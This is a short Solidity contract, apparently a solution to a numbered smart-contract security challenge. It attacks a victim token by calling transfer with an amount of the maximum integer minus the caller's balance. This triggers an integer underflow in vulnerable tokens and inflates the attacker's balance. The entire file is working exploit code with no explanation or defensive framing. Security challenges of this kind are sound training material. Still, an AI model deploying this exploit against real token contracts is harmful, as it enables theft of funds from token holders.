// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./interfaces/5-IToken.sol";

contract TokenAttack {
    IToken public immutable victimToken;
    uint256 internal constant MAX_INT = 2**256 - 1;

    constructor(IToken victimToken_) {
        victimToken = victimToken_;
    }

    function attack() external {
        uint256 balance = victimToken.balanceOf(msg.sender);

        victimToken.transfer(msg.sender, MAX_INT - balance - 1);

        require(
            balance < victimToken.balanceOf(msg.sender),
            "Token: Attack failed"
        );
    }
}
